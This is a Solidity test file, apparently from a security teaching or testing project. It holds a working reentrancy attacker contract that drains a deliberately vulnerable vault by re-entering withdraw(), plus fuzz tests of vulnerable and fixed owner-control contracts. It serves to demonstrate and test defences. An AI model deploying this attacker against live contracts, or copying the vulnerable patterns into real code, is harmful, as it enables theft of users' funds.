// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../vulnerable/ReentrancyVulnerable.sol";
import "../secure/ReentrancyFixed.sol";
import "../vulnerable/AccessControlVulnerable.sol";
import "../secure/AccessControlFixed.sol";

contract AttackReentrant {
    ReentrancyVulnerable public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < 3 && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }
}

contract SecurityTest {
    ReentrancyVulnerable vulnVault;
    ReentrancyFixed secureVault;
    AccessControlVulnerable vulnAccess;
    AccessControlFixed secureAccess;

    function setUp() public {
        vulnVault = new ReentrancyVulnerable();
        secureVault = new ReentrancyFixed();
        vulnAccess = new AccessControlVulnerable();
        secureAccess = new AccessControlFixed();
    }

    // Fuzz test property: Unauthorized caller invariant
    function testFuzz_UnauthorizedOwnerBypass(address caller, address attacker) public {
        if (caller == address(this) || attacker == address(0)) return;

        // On vulnerable contract, attacker can overwrite owner freely
        vulnAccess.setOwner(attacker);
        assert(vulnAccess.owner() == attacker);
    }

    // Fuzz test property: Secure contract rejects non-owner transfer
    function testFuzz_SecureOwnerProtection(address attacker) public {
        if (attacker == address(this) || attacker == address(0)) return;

        // In secure vault, attacker cannot hijack pendingOwner
        try secureAccess.acceptOwnership() {
            // Should fail because attacker is not pendingOwner
            assert(false);
        } catch {
            assert(true);
        }
    }
}
